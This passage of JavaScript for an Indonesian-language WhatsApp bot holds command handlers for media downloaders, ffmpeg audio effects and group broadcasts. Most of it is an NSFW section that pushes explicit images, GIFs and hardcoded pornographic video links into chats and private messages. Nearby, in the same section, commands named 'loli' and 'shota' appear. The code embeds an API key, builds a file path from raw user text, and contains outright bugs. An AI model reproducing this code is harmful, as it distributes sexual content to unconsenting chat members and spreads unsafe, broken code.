alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'tentacles':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/tentacles.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'thights':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/thights.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'yuri':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/yuri.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'zettai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/zettai.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'gifblowjob':
reply('matte kudasai (눈‸눈)')
  let assss =  await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff =  fetchBuffer(assss.data.url)
    var bogif =  buffergif(bobuff)
     alice.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/gifs.json'))
var aliceyresultx = pickRandom(ahegaonsfw)
     alice.sendMessage(m.chat,{video:aliceyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
reply('matte kudasai (눈‸눈)')
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy =  fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy =  fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
alice.sendMessage(m.chat, { image: { url: yeha }, caption : "don banj, follow saluran Alice" }, { quoted: m })
}
break

































// FITUR DOWNLOAD
case 'ttdl': case 'tiktok':
  if (!text) {
    return reply('`HARAP MASUKAN URL!!`\ncontoh : .tiktok https://vm.tiktok.com/xxxxx')
  }
  if (!text.match(/tiktok/gi)) {
    return reply('`URL yang anda berikan tidak valid!`')
  }
TikTok(text).then(async resi => {
let taeh = `Title : ${resi.title}
Author : ${resi.author}`
await await alice.sendMessage(from, {video: {url: resi.nowm}, caption: taeh})
})
break
case 'zypshare': case 'zsdl':
let zsExtract = require('zs-extract')
if (!args[0]) return reply(`Harap masukan link yang ingin anda unduh\n\nContoh : ${usedPrefix + command} https://www4.zippyshare.com/v/uBGCbNHt/file.html`)
let res = await zsExtract.extract(args[0])
let { download, filenamem } = res
reply(JSON.stringify(res, null, 2))
alice.sendMessage(m.chat, { react: { text: "📂", key: m.key } });
alice.sendFile(m.chat, download, filenamem, filenamem, m)
break
case 'megadl':
const { File } = require('megajs')
const { fileTypeFromBuffer } = require('file-type')
alice.room = alice.room ? alice.room : {}
if (!args[0]) return reply795(`Masukan Url!\n\nContoh :\n${prefix + command} https://mega.nz/file/FltHDCzD#oNm8SD_e9oFTCczmnEW4zB9gsakSGzVaVtd9euj7yK8`)
let asw = 'mega_' + m.sender
if (asw in alice.room) return reply('Kamu Masih Mendownload!')
alice.room[asw] = true
var file = File.fromURL(args[0])
reply(mess.wait)
try {
file = await file.loadAttributes()
var data = await file.downloadBuffer()
let mimetype = await fileTypeFromBuffer(data)
await alice.sendMessage(m.chat, { document: data, fileName: file.name, mimetype }, { quoted: m })
} catch (e) {
console.log(e)
throw 'Internal Error'
} finally {
delete alice.room[asw]
}
break
case 'capcutdl': case 'capcut':
if (!text) throw `Linknya?\nExample: *.${command} https://www.capcut.com/template-detail/7254579764793511170?template_id=7254579764793511170&share_token=50c68e86-b857-40d7-9056-6c5db8b37c4c&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1*`
reply(mess.wait)
  var resk = await fetch(`https://aemt.me/download/capcut?url=${text}`)
  let json = await resk.json()
  let v = json.result
  let cap = `Suksess Download Media`
alice.sendMessage(m.chat, { video: { url: v.video_ori }, caption: cap }, m)
break
case 'git': case 'gitclone':
if (!args[0]) return reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/Alice/Project-Alice`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
var [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
var url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
alice.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
.catch(console.error)
break
case 'happymod':{
if (!q) return reply(`Example ${prefix+command} Sufway surfer mod`)
reply(mess.wait)
let kat = await scp2.happymod(q)
reply(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return reply(`Enter the Google Drive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply795(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	alice.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case "fbdl2":
{
await loading()
fetchJson(`https://oni-chan.my.id/api/download/facebook?url=${args[0]}`).then(res => {
alice.sendMessage(from, {video: {url: res.videoUrl}, caption: `Title: ${res.title}\n\n`}, {quoted: fcall})
})
}
break
case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
  if (!text) return reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return reply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      alice.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      alice.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
           case 'fb':
           case 'fbdl': {
           if (!args[0]) {
    return reply(`Kirim link video dari Facebook\n\nExample :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return reply('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    alice.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    reply('Maybe private video!')
  }
  }
  break
case 'terabox': case 'tbdl':
if (!isPremium && !isOwner)
if (!text) return reply('input the link!')
await terabox(text)
break
case 'mediafire': {
	if (args.length == 0) return reply795(`*Gunakan Dengan*\n  Example : .mediafire https://mediafire.com`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Link Mungkin Expired!`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 1000) return reply('Oops, Alice Tidak Mampu Mendownloadnya :^(')
	const result4 = `*DOWNLOADER MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
alice.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'spotifydl':{
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://open.spotify.com/track/6cHCixTkEFATjcu5ig8a7I`)
reply(mess.wait)
let anu = await fetchJson(`https://api.nomisec07.site/api/spotify?url=${text}`)
const aud = anu.data.url
alice.sendMessage(m.chat, {
audio: {
url: aud
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: anu.data.title,
body: "",
thumbnailUrl: anu.data.thumbnail,
sourceUrl: audioUrl,
mediaType: 1,
showAdAttribution: false,
renderLargerThumbnail: true
}
}
}, {
quoted: floc
});
}
break
case 'play': case 'ytplay': case 'ytdl': {
if (ceklimit(m.sender, 1)) return reply(`Limit Anda Habis! anda bisa membeli limit dengan saldo dengan cara mengetik *belilimit*`)
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let search = await yts(`${text}`)
let todd2 = await getBuffer(search.all[0].image)
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./.npm/${text}.mp3`
let nana = ytdl(ply, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3file))
.on('finish', async () => {
await delay(3000)
alice.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt: true }, m)
})
const alicevidoh = require('./lib/ytdl2')
const vid=await alicevidoh.mp4(`${search.videos[0].url}`)
const ytc=`♽ *Tittle :* ${vid.title}
♽ *Date :* ${vid.date}
♽ *Duration :* ${search.all[0].timestamp}
♽ *Quality :* ${vid.quality}
♽ *Channel :* ${search.all[0].author.name}
♽ *Upload :* ${search.all[0].ago}`
await alice.sendMessage(m.chat, {
video: {url: vid.videoUrl},
mimetype: 'video/mp4',
thumbnail: todd2,
caption: ytc,
contextInfo: {
forwardingScore: 0,  
isForwarded: true,  
businessMessageForwardInfo: {
businessOwnerJid:botNumber }
}
  }, {
    quoted: m
  })

}
break //Powered By alice & Darwin
case'ytdok': {
if (!text) throw `Example: ${prefix + command} https://youtu.be/B6pn7E8ecxg?si=okL1ZNjdititvtvf`
let anu = await bochil.youtubedl(text)
let data = await anu.audio['128kbps'].download()
if (anu.audio['128kbps'].fileSize > 10000) return reply(`Ukuran melebihi batas maksimal 10 MB\n\n*link download*\n${data}`)
alice.sendMessage(m.chat, anu.thumbnail, `⭔ title : ${anu.title}\n⭔ quality : ${anu.audio['128kbps'].quality}\n⭔ file size hd : ${anu.audio['128kbps'].fileSizeH}\n⭔ file size : ${anu.audio['128kbps'].fileSize}\n⭔ source url : ${q}`,)
alice.sendMessage(m.chat, { document: { url: data }, mimetype: 'audio/mp4', fileName: `${anu.title}.mp3`}, )
}
break //Powered By alice & Darwin
case'ytvn': {
if (!text) throw `Example: ${prefix + command} https://youtu.be/B6pn7E8ecxg?si=okL1ZNjdititvtvf`
let anu = await bochil.youtubedl(text)
let data = await anu.audio['128kbps'].download()
if (anu.audio['128kbps'].fileSize > 10000) return reply(`Ukuran melebihi batas maksimal 10 MB\n\n*link download*\n${data}`)
alice.sendMessage(from, anu.thumbnail, `⭔ title : ${anu.title}\n⭔ quality : ${anu.audio['128kbps'].quality}\n⭔ file size hd : ${anu.audio['128kbps'].fileSizeH}\n⭔ file size : ${anu.audio['128kbps'].fileSize}\n⭔ source url : ${q}`,)
alice.sendMessage(m.chat, { audio: { url: data }, mimetype: 'audio/mp4', ptt: true, fileName: `${anu.title}.mp3`}, )
}
break //Powered By alice & Darwin
case 'ytvideo':
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await alice.sendMessage(m.chat, {text: `_Searching.. [ ${text} ] 🔍_`}, {quoted: m, ephemeralExpiration: m.expiration})
let search = await yts(`${text}`)
const alicevidoh = require('./lib/ytdl2')
const vid=await alicevidoh.mp4(`${search.videos[0].url}`)
if (vid.videoUrl.fileSize > 10000) return reply(`Ukuran melebihi batas maksimal 50 MB`)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
var ppt = await prepareWAMessageMedia({ video: {url:vid.videoUrl}}, { upload: alice.waUploadToServer })
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt.videoMessage, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
alice.relayMessage(from, ptv.message, { messageId: ptv.key.id })
await alice.sendMessage(m.chat,{
    text: ytc
})

await alice.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: m.expiration});
break
case 'ytmp4': {
if (!isGroup) return onlyGroup()
const alicevidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !alicevidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await alicevidoh.mp4(text)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
await alice.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytmp3': case 'youtubemp3': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
reply('memuat...')
downloadMp3(text)
}
break

case'xnxxdl':
{
if (!text) return reply(`*Gunakan Dengan*\n\nexample : ${prefix+command} linknya`)
let anu = await fetchJson(`https://skizo.tech/api/xnxxdl?urlxnxx=${text}&apikey=${global.skizo}`)
const cpt = anu.title
const nick = anu.quality
alice.sendMessage(m.chat, { video: { url: anu.url}, caption: `*TITLE* : ${cpt}\n*QUALITY* : ${nick}`}, )
}
break





































































// FITUR AUDIO
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply('tunggu sebentar')
let media = await alice.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
alice.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break














































// FITUR NSFW
case 'hentaisearch':
if (!text) throw '*[ Wrong ]* please input query'
reply(mess.wait)
let searchResults = await searchHentai(text)
var memek = searchResults.result.map((v, i) => `*${i + 1}.* ${v.title}
Views : ${v.views}
Link : ${v.url}`).join('\n')
let randomThumbnail
if (searchResults.result.length > 0) {
let randomIndex = Math.floor(Math.random() * searchResults.result.length)
randomThumbnail = searchResults.result[randomIndex].thumbnail
alice.sendMessage(from, {image: {url:randomThumbnail}, caption:memek},{quoted:fpayment2})
} else {
//randomThumbnail = 'https://pictures.hentai-foundry.com/e/Error-Dot/577798/Error-Dot-577798-Zero_Two.png'
elorr = '*[ Error ]* hasil tidak ada'
}
break

case 'pornhubgif':{
if (!text) return m.reply("Input query")
try {
let res = await searchGif(text)
let teks = res.map((item, index) => {
return `*[ RESULT ${index + 1} ]*
*Title:* ${item.title}
*Url:* ${item.url}
*Webm:* ${item.webm}
`
}).filter(v => v).join("\n________________________\n")
await reply795(teks)
} catch (e) {
}}
break
case 'pornhubvid':
if (!text) return m.reply("Input query")
try {
let res = await searchVideo(text)
let teks = res.map((item, index) => {
    return `*[ RESULT ${index + 1} ]*
*Link :* ${item.link}
*Title :* ${item.title}
*Uploader :* ${item.uploader}
*Views :* ${item.views}
*Duration :* ${item.duration}
`
}).filter(v => v).join("\n")
await reply795(teks)
} catch (e) {
await m.reply(eror)
}
break
case 'bokep': case 'hentaivid2': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
reply(mess.wait)
let sbe = await hentaivid()
let cejd = sbe[Math.floor(Math.random(), sbe.length)]
alice.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
case 'hentaivid': case 'hentaivideo': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
reply('cotto matte kudasaii')
const { hentai } = require('./lib/scraperr.js')
let anu = await hentai()
let result912 = anu[Math.floor(Math.random(), anu.length)]
alice.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Title : ${result912.title}\nCategory : ${result912.category}\nMimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
}
break
case 'paptt':
if(!isGroup) return onlyGroup()
if (!q) return reply(`Example ${prefix + command} foto/video`)
let papttfoto = JSON.parse(fs.readFileSync('./database/foto.json'))
let papttvideo = JSON.parse(fs.readFileSync('./database/video.json'))
let titid1 = (pickRandom(papttfoto))
let titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
reply("Foto Akan Dikirim Lewat Private Chat")
alice.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
reply("Video Akan Dikirim Lewat Private Chat")
alice.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Kiamat sudah dekat'})
}
break
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina2':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
if (!isGroup) return onlyGroup()
alice.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=haikalgans` } })
break //Powered By alice & Darwin
case 'bokep1':
let ntahlah1 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`)
alice.sendMessage(from, { video: ntahlah1, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep2':
let ntahlah2 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
alice.sendMessage(from, { video: ntahlah2, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep3':
let ntahlah3 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
alice.sendMessage(from, { video: ntahlah3, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep4':
let ntahlah4 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
alice.sendMessage(from, { video: ntahlah4, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep5':
let ntahlah5 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
alice.sendMessage(from, { video: ntahlah5, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep6':
let ntahlah6 = await getBuffer(`https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`)
alice.sendMessage(from, { video: ntahlah6, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep7':
let ntahlah7 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
alice.sendMessage(from, { video: ntahlah7, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep8':
let ntahlah8 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
alice.sendMessage(from, { video: ntahlah8, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep9':
let ntahlah9 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
alice.sendMessage(from, { video: ntahlah9, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep10':
let ntahlah10 = await getBuffer(`https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`)
alice.sendMessage(from, { video: ntahlah10, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep11':
let ntahlah11 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
alice.sendMessage(from, { video: ntahlah11, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep12':
let ntahlah12 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
alice.sendMessage(from, { video: ntahlah12, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep13':
let ntahlah13 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
alice.sendMessage(from, { video: ntahlah13, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep14':
if (!isGroup) return onlyGroup()
let ntahlah14 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
alice.sendMessage(from, { video: ntahlah14, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep15':
if (!isGroup) return onlyGroup()
let ntahlah15 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
alice.sendMessage(from, { video: ntahlah15, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep16':
if (!isGroup) return onlyGroup()
let ntahlah16 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`)
alice.sendMessage(from, { video: ntahlah16, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep17':
if (!isGroup) return onlyGroup()
let ntahlah17 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
alice.sendMessage(from, { video: ntahlah17, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep18':
if (!isGroup) return onlyGroup()
let ntahlah18 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
alice.sendMessage(from, { video: ntahlah18, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case'xnxxs':
{
if (!text) return reply(`*Gunakan Dengan*\n\nexample : ${prefix+command} bokep nenek`)
let anu = await fetchJson(`https://skizo.tech/api/xnxxsearch?title=${text}&apikey=${global.skizo}`)
let teks = ``
for (let v of anu) {
teks += `*Title* : ${v.title}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}
reply(teks) 
}
break
case "boton":{
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlahh9 = `./assets/audio/IMLEK.mp3`
let getGroups = await alice.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)

let teks22 = `*[!] ANNOUNCEMENT*📢\n\n_BOT telah online, sekarang anda bisa menjadi bot clone dengan cara, *ketik .jadibot* dan *ketik .menu* untuk melihat daftar list yang disediakan oleh BOT_`
const buf = await getBuffer(`https://img.moehu.org/pic.php?id=mrfz`)
for (let x of data) {
await alice.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await alice.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await delay(100)
}
reply(`Success send broadcast message to ${data.length} groups chats`)
}
break
case 'gcbot': {
if (!isGroup) return onlyGroup()
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363156560553267@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
	"groupName": "PROJECT ALICE",
	"previewType": "PHOTO",
"renderLargerThumbnail": true,
	"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAEAAgIDAQAAAAAAAAAAAAAABQcDBgEECAL/xAA2EAABAwMBBQYFAwMFAAAAAAABAAIDBAURBgcUITGREkFRUmFxEzKBscEiodEjM0MXJGKC8f/EABoBAQEBAQEBAQAAAAAAAAAAAAAFBgIBBAP/xAAvEQABAwIDBQcEAwAAAAAAAAAAAQIDBAUREyESFDFBUSIygaGxwfBCcdHhFWGR/9oADAMBAAIRAxEAPwD1SiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIThAEXHaC5yEAREQBERAEREAREQBERAEREAREQA8lpW0HV0mn3U8FJEySokBcS7k0Bbm7iqN2o1Px9VytB4RRtZ9z+VRtVM2pqUY9MU1Vfn3J9zqHU9OrmLgpl/wBSr09xLY6ZoBxwaeP7ru0O0y5Cpj3ungfDkBwZkHHoq8i4Pkb656rItUtppHNVNhPP8mc/kqpFx2/Q9O08rZ4GSs+V7Q4fVZFA6JqTV6Yt8xOSYgD7jgfsp4clhpGbD1avI2LHI9qOTmERFydBERAEREAREQBDyXBOFHX68Utmt8lVWPDWtHAd7j4AL1rVcuy3ip45yNTFy4IYtQ3ymsdA+pq34A+Vo5uPgFWcu0+6ueTHTUzWZ4A5JwtX1Nfqq/3B1RUuxGDiOLuYP5US1rnuDWAucTgAcytb